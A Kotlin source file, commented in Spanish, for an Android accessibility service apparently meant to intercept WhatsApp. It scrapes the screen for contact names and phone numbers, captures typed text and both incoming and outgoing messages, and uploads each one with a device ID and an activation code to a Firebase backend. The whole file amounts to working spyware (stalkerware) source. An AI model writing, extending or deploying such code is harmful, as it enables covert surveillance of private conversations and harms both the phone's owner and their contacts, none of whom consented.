package com.example.whatsapp_interceptor

import android.accessibilityservice.AccessibilityService
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import java.util.ArrayDeque
import java.util.HashMap
import android.content.Context
import android.content.SharedPreferences

class WhatsAppAccessibilityService : AccessibilityService() {
    companion object {
        const val TAG = "WhatsAppInterceptor"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val MAX_RECENT_MESSAGES = 200
        private const val RECENT_MESSAGE_EXPIRY_MS = 10000L // 10 segundos
        private const val GLOBAL_MESSAGE_EXPIRY_MS = 60000L // 1 minuto
        private const val CHAT_MONITORING_INTERVAL = 1000L // 1 segundo

        // Mantener una instancia estática para acceso desde Flutter
        var instance: WhatsAppAccessibilityService? = null
    }

    // Firebase service para enviar mensajes
    private lateinit var firebaseService: FirebaseService

    // Coroutines para operaciones en segundo plano
    private val ioScope = CoroutineScope(Dispatchers.IO)
    private val mainScope = CoroutineScope(Dispatchers.Main)

    // ID único del dispositivo
    private lateinit var deviceId: String

    // Caché de mensajes recientes para evitar duplicados (en memoria)
    private val recentMessages = ConcurrentHashMap<String, Long>()

    // Caché global de mensajes procesados (más grande, pero menos accedida)
    private val processedMessages = ConcurrentHashMap<String, Long>()

    // Último nombre de contacto detectado
    private var lastContactName: String? = null

    // Último tipo de contacto (personal o grupo)
    private var lastContactType: String = "personal"

    // Último mensaje pendiente de envío
    private var pendingOutgoingMessage: String? = null

    // Tiempo del último monitoreo de chat
    private var lastChatMonitoringTime: Long = 0

    // Estado del campo de entrada
    private var lastEntryFieldState: String? = null

    // Último estado del botón de envío
    private var lastSendButtonState = false

    // Mapa de contactos por chat - clave: identificador único del chat, valor: nombre del contacto
    private val chatContacts = ConcurrentHashMap<String, String>()

    // Preferencias para activationCode
    private val prefs: SharedPreferences by lazy {
        applicationContext.getSharedPreferences("whatsapp_interceptor_prefs", Context.MODE_PRIVATE)
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Servicio de accesibilidad creado")

        // Inicializar la instancia estática
        instance = this

        // Inicializar Firebase
        firebaseService = FirebaseService.getInstance(applicationContext)
        firebaseService.initFirebase()

        // Obtener ID único del dispositivo
        deviceId = getUniqueDeviceId()

        // Iniciar limpieza periódica de caché de mensajes
        startMessageCacheCleaner()
    }

    // Obtener ID único del dispositivo
    private fun getUniqueDeviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
    }

    // Iniciar tarea de limpieza periódica para la caché de mensajes
    private fun startMessageCacheCleaner() {
        ioScope.launch {
            while (true) {
                cleanMessageCaches()
                delay(TimeUnit.MINUTES.toMillis(5)) // Limpiar cada 5 minutos
            }
        }
    }

    // Limpiar caches de mensajes
    private fun cleanMessageCaches() {
        try {
            val now = System.currentTimeMillis()

            // Limpiar caché reciente
            recentMessages.entries.removeIf { now - it.value > RECENT_MESSAGE_EXPIRY_MS }

            // Limpiar caché global
            processedMessages.entries.removeIf { now - it.value > GLOBAL_MESSAGE_EXPIRY_MS }

            // Limpiar caché de Firebase
            FirebaseService.cleanOldMessages()

            Log.d(TAG, "Caché de mensajes limpiada. Recent: ${recentMessages.size}, Global: ${processedMessages.size}")
        } catch (e: Exception) {
            Log.e(TAG, "Error al limpiar caché: ${e.message}")
        }
    }

    // Agregar mensaje a la caché de recientes
    private fun addToRecentMessages(messageKey: String) {
        val now = System.currentTimeMillis()

        // Agregar a caché reciente
        recentMessages[messageKey] = now

        // Agregar a caché global
        processedMessages[messageKey] = now

        // Marcar como procesado en Firebase
        FirebaseService.markMessageAsProcessed(messageKey)

        // Si la caché reciente es muy grande, eliminar entradas antiguas
        if (recentMessages.size > MAX_RECENT_MESSAGES) {
            val oldestEntry = recentMessages.entries.minByOrNull { it.value }
            oldestEntry?.let { recentMessages.remove(it.key) }
        }
    }

    // Verificar si un mensaje es duplicado
    private fun isMessageDuplicate(messageKey: String): Boolean {
        return recentMessages.containsKey(messageKey) ||
                processedMessages.containsKey(messageKey) ||
                FirebaseService.isMessageProcessed(messageKey)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            // Solo procesar eventos de WhatsApp
            if (event.packageName?.toString() != WHATSAPP_PACKAGE) {
                return
            }

            // Log para depuración
            Log.d(TAG, "Evento: ${eventTypeToString(event.eventType)} (${event.eventType})")

            // Detectar nombre del contacto de manera más agresiva en cambios de ventana
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                // Cuando cambia la ventana, es muy probable que estemos en un nuevo chat
                updateContactNameIfNeeded()

                // Actualizar caché de contactos con la nueva información
                if (lastContactName != null && lastContactName != "Desconocido") {
                    val chatId = generateChatId()
                    chatContacts[chatId] = lastContactName!!
                    Log.d(TAG, "Contacto ${lastContactName} registrado para chat $chatId")
                }
            }

            // Procesar según tipo de evento
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Detectar cambios en campo de texto (escribiendo mensaje)
                    handleTextFieldChanges(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    // Detectar clic en botón de enviar
                    handleButtonClick(event)
                }
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    // Detectar cambios en la ventana (nuevos mensajes)
                    updateContactNameIfNeeded()
                    monitorChatMessages()
                    checkPendingMessage()
                }
                AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                    // Monitorear mensajes cuando se hace scroll
                    monitorChatMessages()
                }
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {
                    Log.d(TAG, "Evento de selección de texto: ${event.text}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando evento: ${e.message}")
        }
    }

    // Generar ID único para el chat actual basado en elementos de la interfaz
    private fun generateChatId(): String {
        try {
            val rootNode = rootInActiveWindow ?: return "default"

            // Intentar obtener algún identificador único para el chat actual
            val chatId = StringBuilder()

            // Intento 1: Usar el nombre del contacto/grupo si está disponible
            if (lastContactName != null && lastContactName != "Desconocido") {
                chatId.append(lastContactName)
            }

            // Intento 2: Intentar encontrar algún identificador en la URL de la imagen de perfil
            val profileImages = rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_contact_photo")
            if (profileImages.isNotEmpty()) {
                for (node in profileImages) {
                    // Si tiene una URL de imagen o identificador único
                    if (node.contentDescription != null) {
                        chatId.append("|").append(node.contentDescription)
                        break
                    }
                }
            }

            // Si no tenemos nada, usar la hora actual como último recurso
            if (chatId.isEmpty()) {
                chatId.append("chat_").append(System.currentTimeMillis())
            }

            return chatId.toString()
        } catch (e: Exception) {
            Log.e(TAG, "Error generando chat ID: ${e.message}")
            return "default_${System.currentTimeMillis()}"
        }
    }

    // Convertir tipo de evento a string para logging
    private fun eventTypeToString(eventType: Int): String {
        return when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "TYPE_VIEW_CLICKED"
            AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> "TYPE_VIEW_LONG_CLICKED"
            AccessibilityEvent.TYPE_VIEW_SELECTED -> "TYPE_VIEW_SELECTED"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "TYPE_VIEW_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TYPE_VIEW_TEXT_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "TYPE_WINDOW_STATE_CHANGED"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "TYPE_NOTIFICATION_STATE_CHANGED"
            AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> "TYPE_VIEW_HOVER_ENTER"
            AccessibilityEvent.TYPE_VIEW_HOVER_EXIT -> "TYPE_VIEW_HOVER_EXIT"
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START -> "TYPE_TOUCH_EXPLORATION_GESTURE_START"
            AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END -> "TYPE_TOUCH_EXPLORATION_GESTURE_END"
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> "TYPE_WINDOW_CONTENT_CHANGED"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "TYPE_VIEW_SCROLLED"
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> "TYPE_VIEW_TEXT_SELECTION_CHANGED"
            else -> "UNKNOWN_TYPE"
        }
    }

    // Buscar nombre del contacto en la UI con mayor precisión
    private fun findContactName(): String? {
        try {
            val rootNode = rootInActiveWindow ?: return null

            // Priorizar IDs específicos de WhatsApp para el nombre del contacto
            val reliableIds = listOf(
                "com.whatsapp:id/conversation_contact_name",
                "com.whatsapp:id/conversation_title",
                "com.whatsapp:id/toolbar_title"
            )

            var phoneNumberFallback: String? = null

            for (id in reliableIds) {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
                if (nodes.isNotEmpty() && nodes[0].isVisibleToUser && nodes[0].text != null) {
                    val name = nodes[0].text.toString().trim()
                    if (name.isNotEmpty() && !name.contains("WhatsApp") && name.length > 2) {
                        // Si el texto parece un número de teléfono, lo guardamos como respaldo
                        if (name.startsWith("+") || name.matches(Regex("\\d{10,}"))) {
                            Log.d(TAG, "Número de teléfono detectado en ID $id: $name, buscando nombre alternativo")
                            phoneNumberFallback = name
                            continue
                        }
                        Log.d(TAG, "Contacto detectado por ID $id: $name")
                        return name
                    }
                }
            }

            // Verificar en la jerarquía de la barra de acción
            val toolbarNodes = rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/toolbar")
            for (node in toolbarNodes) {
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    if (child.className?.contains("TextView") == true && child.isVisibleToUser && child.text != null) {
                        val name = child.text.toString().trim()
                        if (name.isNotEmpty() && !name.contains("WhatsApp") && !name.contains("Mensaje") && name.length > 2) {
                            // Si el texto parece un número de teléfono, lo guardamos como respaldo
                            if (name.startsWith("+") || name.matches(Regex("\\d{10,}"))) {
                                Log.d(TAG, "Número de teléfono detectado en toolbar: $name, buscando nombre alternativo")
                                phoneNumberFallback = name
                                continue
                            }
                            Log.d(TAG, "Contacto detectado en toolbar: $name")
                            return name
                        }
                    }
                }
            }

            // Si no encontramos un nombre real, devolvemos el número de teléfono como respaldo
            if (phoneNumberFallback != null) {
                Log.d(TAG, "No se encontró nombre real, usando número de teléfono como respaldo: $phoneNumberFallback")
                return phoneNumberFallback
            }

            return null
        } catch (e: Exception) {
            Log.e(TAG, "Error al buscar nombre de contacto: ${e.message}")
            return null
        }
    }

    // Método alternativo con búsqueda más precisa
    private fun findContactNameAlternative(): String? {
        try {
            val rootNode = rootInActiveWindow ?: return null

            // Usar cola para explorar jerarquía, con filtros estrictos
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(rootNode)

            var phoneNumberFallback: String? = null

            while (queue.isNotEmpty()) {
                val node = queue.removeFirst()

                // Buscar solo TextViews visibles en la parte superior
                if (node.className?.contains("TextView") == true && node.isVisibleToUser && node.text != null) {
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)

                    // Filtrar por posición (parte superior) y tamaño razonable
                    val screenHeight = resources.displayMetrics.heightPixels
                    if (rect.top < screenHeight * 0.1 && rect.height() < screenHeight * 0.1) {
                        val text = node.text.toString().trim()
                        if (text.isNotEmpty() && text.length > 2 &&
                            !text.contains("WhatsApp", ignoreCase = true) &&
                            !text.contains("Mensaje", ignoreCase = true) &&
                            !text.contains("Escribe", ignoreCase = true) &&
                            !text.contains("typing", ignoreCase = true)) {
                            // Si el texto parece un número de teléfono, lo guardamos como respaldo
                            if (text.startsWith("+") || text.matches(Regex("\\d{10,}"))) {
                                Log.d(TAG, "Número de teléfono detectado en TextView superior: $text, buscando más opciones")
                                phoneNumberFallback = text
                                continue
                            }
                            Log.d(TAG, "Contacto alternativo detectado: $text (posición: ${rect.top})")
                            return text
                        }
                    }
                }

                // Agregar hijos solo si están en la parte superior
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    val childRect = android.graphics.Rect()
                    child.getBoundsInScreen(childRect)
                    if (childRect.top < resources.displayMetrics.heightPixels * 0.2) {
                        queue.add(child)
                    }
                }
            }

            // Intentar buscar en la lista de chats recientes (si estamos en la pantalla principal de WhatsApp)
            val chatListNodes = rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/contact_row_name")
            for (node in chatListNodes) {
                val name = node.text?.toString()?.trim() ?: continue
                if (name.isNotEmpty() && name.length > 2 &&
                    !name.contains("WhatsApp", ignoreCase = true) &&
                    !name.contains("Mensaje", ignoreCase = true)) {
                    // Si el texto parece un número de teléfono, lo guardamos como respaldo
                    if (name.startsWith("+") || name.matches(Regex("\\d{10,}"))) {
                        Log.d(TAG, "Número de teléfono detectado en lista de chats: $name, buscando más opciones")
                        phoneNumberFallback = name
                        continue
                    }
                    Log.d(TAG, "Contacto detectado en lista de chats: $name")
                    return name
                }
            }

            // Usar caché si no se encuentra nada
            val chatId = generateChatId()
            if (chatContacts.containsKey(chatId)) {
                val cachedName = chatContacts[chatId]
                Log.d(TAG, "Contacto recuperado de caché para chat $chatId: $cachedName")
                return cachedName
            }

            // Si no encontramos un nombre real, devolvemos el número de teléfono como respaldo
            if (phoneNumberFallback != null) {
                Log.d(TAG, "No se encontró nombre real, usando número de teléfono como respaldo: $phoneNumberFallback")
                return phoneNumberFallback
            }

            Log.w(TAG, "No se encontró contacto ni número de teléfono, devolviendo 'Desconocido'")
            return "Desconocido"
        } catch (e: Exception) {
            Log.e(TAG, "Error al buscar nombre alternativo: ${e.message}")
            return "Desconocido"
        }
    }

    // Actualizar nombre del contacto si es necesario
    private fun updateContactNameIfNeeded() {
        val contactName = findContactName() ?: findContactNameAlternative()
        if (contactName != null && contactName != lastContactName) {
            lastContactName = contactName

            // Determinar si es un grupo o chat personal
            lastContactType = if (contactName.contains("(") ||
                contactName.contains("grupo", ignoreCase = true) ||
                contactName.contains("Group", ignoreCase = true)) {
                "group"
            } else {
                "personal"
            }

            // Actualizar contacto en Firebase
            ioScope.launch {
                updateContactInfo(contactName, lastContactType)
            }

            // Actualizar caché de contactos
            val chatId = generateChatId()
            chatContacts[chatId] = contactName
            Log.d(TAG, "Contacto $contactName registrado/actualizado para chat $chatId")
        }
    }

    // Actualizar información de contacto
    private suspend fun updateContactInfo(name: String, type: String) {
        try {
            val success = firebaseService.updateContactInFirestore(name, type, deviceId)
            if (success) {
                Log.d(TAG, "Información de contacto actualizada: $name ($type)")
            } else {
                Log.e(TAG, "Error al actualizar información de contacto: $name")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error al actualizar información de contacto: ${e.message}")
        }
    }

    // Manejar cambios en el campo de texto
    private fun handleTextFieldChanges(event: AccessibilityEvent) {
        if (event.source == null) return

        try {
            val messageText = event.text?.joinToString("") ?: ""

            // Verificar si es el campo de entrada de mensajes
            if (isEntryField(event.source)) {
                // Guardar estado actual del campo
                lastEntryFieldState = messageText

                if (messageText.isNotEmpty()) {
                    Log.d(TAG, "Mensaje detectado en campo de entrada: '$messageText'")
                    pendingOutgoingMessage = messageText
                } else if (pendingOutgoingMessage != null) {
                    // Campo se vació, posible envío de mensaje
                    Log.d(TAG, "Campo de entrada vacío después de tener texto. Posible envío de mensaje.")

                    // No procesamos inmediatamente, esperamos a ver el mensaje en la UI
                    ioScope.launch {
                        delay(500) // Esperar un poco para que WhatsApp actualice la UI
                        checkMessageSent()
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando cambio de texto: ${e.message}")
        } finally {
            event.source?.recycle()
        }
    }

    // Verificar si un nodo es el campo de entrada de mensajes
    private fun isEntryField(nodeInfo: AccessibilityNodeInfo?): Boolean {
        if (nodeInfo == null) return false

        // Verificar por ID
        val id = nodeInfo.viewIdResourceName ?: ""
        if (id.contains("entry") || id == "com.whatsapp:id/entry") {
            return true
        }

        // Verificar por hint
        val hint = nodeInfo.text?.toString() ?: ""
        if (hint.contains("mensaje") || hint.contains("message")) {
            return true
        }

        // Verificar propiedades típicas de campo de entrada
        return nodeInfo.isEditable &&
                nodeInfo.className?.toString()?.contains("EditText") == true
    }

    // Verificar si se ha enviado un mensaje después de vaciar el campo
    private fun checkMessageSent() {
        val message = pendingOutgoingMessage ?: return

        try {
            Log.d(TAG, "Verificando si se envió el mensaje: $message")

            // Buscar el mensaje en la UI (debería aparecer como burbuja a la derecha)
            val rootNode = rootInActiveWindow ?: return
            val messageElements = findOutgoingMessageNodes(rootNode)

            for (node in messageElements) {
                val text = node.text?.toString() ?: continue

                if (text.contains(message)) {
                    Log.d(TAG, "¡Mensaje encontrado en la UI! Confirmando envío: $text")
                    processMessageImmediate(message, "outgoing")
                    pendingOutgoingMessage = null
                    break
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error al verificar envío de mensaje: ${e.message}")
        }
    }

    // Manejar clic en botones
    private fun handleButtonClick(event: AccessibilityEvent) {
        val source = event.source ?: return

        try {
            // Verificar si es el botón de enviar
            if (isSendButton(source)) {
                Log.d(TAG, "Botón de enviar detectado")

                // Ahora manejamos el envío esperando ver el mensaje en la UI
                lastSendButtonState = true

                // No procesamos inmediatamente, esperamos confirmación
                ioScope.launch {
                    delay(500) // Esperar actualización de UI
                    checkMessageSent()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando clic: ${e.message}")
        } finally {
            source.recycle()
        }
    }

    // Verificar si un nodo es el botón de enviar
    private fun isSendButton(nodeInfo: AccessibilityNodeInfo): Boolean {
        // Verificar por ID
        val id = nodeInfo.viewIdResourceName ?: ""
        if (id.contains("send") || id.contains("enviar")) {
            return true
        }

        // Verificar por contenido de descripción
        val desc = nodeInfo.contentDescription?.toString()?.lowercase() ?: ""
        if (desc.contains("enviar") || desc.contains("send") ||
            desc.contains("mensaje") || desc.contains("message")) {
            Log.d(TAG, "Detectado botón de enviar por descripción: $desc")
            return true
        }

        // También revisar si es botón de mensajes de voz (transformable a enviar)
        if (desc.contains("voz") || desc.contains("voice") ||
            desc.contains("audio") || desc.contains("mic")) {
            Log.d(TAG, "Detectado botón de mensajes de voz (transformable): $desc")
            return pendingOutgoingMessage != null // Solo considerar si hay mensaje pendiente
        }

        return false
    }

    // Procesar mensaje pendiente manualmente
    private fun processPendingMessage() {
        val messageText = pendingOutgoingMessage
        if (!messageText.isNullOrEmpty()) {
            Log.d(TAG, "Procesando mensaje pendiente manualmente: $messageText")
            processMessageImmediate(messageText, "outgoing")
            pendingOutgoingMessage = null
        }
    }

    // Verificar periódicamente si hay un mensaje pendiente sin procesar
    private fun checkPendingMessage() {
        val message = pendingOutgoingMessage
        if (!message.isNullOrEmpty() && lastSendButtonState) {
            Log.d(TAG, "Verificando mensaje pendiente después de clic en botón: $message")
            lastSendButtonState = false

            // Buscar el mensaje en la UI antes de procesarlo
            ioScope.launch {
                delay(500) // Esperar actualización de UI
                checkMessageSent()
            }
        }
    }

    // Método para obtener el activationCode desde SharedPreferences
    private fun getActivationCode(): String {
        return prefs.getString("activation_code", "default_code") ?: "default_code"
    }

    // Procesar mensaje de manera inmediata
    private fun processMessageImmediate(messageText: String, direction: String) {
        try {
            // Verificar si el mensaje ya ha sido procesado recientemente
            val messageKey = "${messageText}|${lastContactName ?: "unknown"}|$direction"

            // Verificar en caché local primero (más rápido)
            if (isMessageDuplicate(messageKey)) {
                Log.d(TAG, "Mensaje duplicado ignorado: $messageText (dirección: $direction)")
                return
            }

            // Si no es duplicado, agregarlo a la caché
            addToRecentMessages(messageKey)

            // Si es un mensaje entrante y no tenemos nombre de contacto, intentar usar
            // el último contacto con el que se envió un mensaje
            var contactName = lastContactName
            if (direction == "incoming" && (contactName == null || contactName == "Desconocido")) {
                // Buscar en la caché de contactos
                val chatId = generateChatId()
                if (chatContacts.containsKey(chatId)) {
                    contactName = chatContacts[chatId]
                    Log.d(TAG, "Usando contacto de caché para mensaje entrante: $contactName")
                }
            }

            // Preparar datos del mensaje para Firebase
            val data = HashMap<String, Any>()
            data["content"] = messageText
            data["timestamp"] = System.currentTimeMillis().toString()
            data["recipientName"] = contactName ?: "Desconocido"
            data["recipientType"] = lastContactType
            data["direction"] = direction
            data["isRead"] = true
            data["deviceId"] = deviceId
            data["activationCode"] = getActivationCode() // <-- AGREGADO

            // Enviar mensaje a Firebase (en segundo plano)
            ioScope.launch {
                val success = firebaseService.sendMessageToFirestore(data)
                if (success) {
                    Log.d(TAG, "Mensaje enviado exitosamente a Firebase: $messageText (dirección: $direction)")
                } else {
                    Log.e(TAG, "Error al enviar mensaje a Firebase: $messageText (dirección: $direction)")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error al procesar mensaje: ${e.message}")
        }
    }

    // Monitorear mensajes del chat
    private fun monitorChatMessages() {
        val now = System.currentTimeMillis()

        // Limitar la frecuencia de escaneo para no sobrecargar el sistema
        if (now - lastChatMonitoringTime < CHAT_MONITORING_INTERVAL) {
            return
        }

        lastChatMonitoringTime = now

        try {
            // Obtener el nodo raíz
            val rootNode = rootInActiveWindow ?: return

            // Buscar elementos de texto que podrían ser mensajes
            findIncomingMessages(rootNode)
        } catch (e: Exception) {
            Log.e(TAG, "Error monitoreando mensajes del chat: ${e.message}")
        }
    }

    // Buscar mensajes entrantes en la UI
    private fun findIncomingMessages(rootNode: AccessibilityNodeInfo) {
        try {
            // Obtener todos los nodos con ID de mensaje
            val messageNodes = rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text")
            if (messageNodes.isEmpty()) return

            // Recorrer nodos de mensajes
            for (node in messageNodes) {
                // Verificar si tiene texto
                val messageText = node.text?.toString() ?: continue
                if (messageText.isEmpty()) continue

                // Determinar si es mensaje entrante o saliente por su posición
                val direction = determineMessageDirection(node)

                // Procesar el mensaje si no está en caché
                Log.d(TAG, "Mensaje detectado ($direction): $messageText")
                processMessageImmediate(messageText, direction)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error buscando mensajes entrantes: ${e.message}")
        }
    }

    // Determinar dirección del mensaje (entrante/saliente) por posición en pantalla
    private fun determineMessageDirection(node: AccessibilityNodeInfo): String {
        try {
            val rect = android.graphics.Rect()
            node.getBoundsInScreen(rect)

            // Obtener ancho de pantalla
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels

            // Calcular centro de la pantalla
            val screenCenter = screenWidth / 2

            // Si está a la derecha es saliente, a la izquierda entrante
            return if (rect.centerX() > screenCenter) {
                Log.d(TAG, "Mensaje a la derecha (saliente): ${rect.centerX()} > $screenCenter")
                "outgoing"
            } else {
                Log.d(TAG, "Mensaje a la izquierda (entrante): ${rect.centerX()} < $screenCenter")
                "incoming"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error determinando dirección del mensaje: ${e.message}")
            return "unknown"
        }
    }

    // Encontrar nodos de mensaje saliente por posición
    private fun findOutgoingMessageNodes(rootNode: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()

        try {
            // Buscar todos los nodos con texto
            val allTextViews = findNodesByClassName(rootNode, "android.widget.TextView")

            // Obtener dimensiones de pantalla
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val screenCenter = screenWidth / 2

            // Filtrar por posición (a la derecha) y contenido
            for (node in allTextViews) {
                if (node.text == null) continue

                // Verificar posición
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)

                // Si está a la derecha del centro
                if (rect.centerX() > screenCenter) {
                    result.add(node)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error buscando nodos de mensaje saliente: ${e.message}")
        }

        return result
    }

    // Buscar nodos por clase
    private fun findNodesByClassName(rootNode: AccessibilityNodeInfo, className: String): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(rootNode)

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()

            // Verificar clase
            if (node.className?.contains(className) == true) {
                result.add(node)
            }

            // Agregar hijos a la cola
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                queue.add(child)
            }
        }

        return result
    }

    // Limpieza al parar el servicio
    override fun onDestroy() {
        super.onDestroy()
        instance = null
        Log.d(TAG, "Servicio de accesibilidad destruido")
    }

    // Interrupción del servicio (probablemente el usuario deshabilita accesibilidad)
    override fun onInterrupt() {
        Log.d(TAG, "Servicio de accesibilidad interrumpido")
    }
}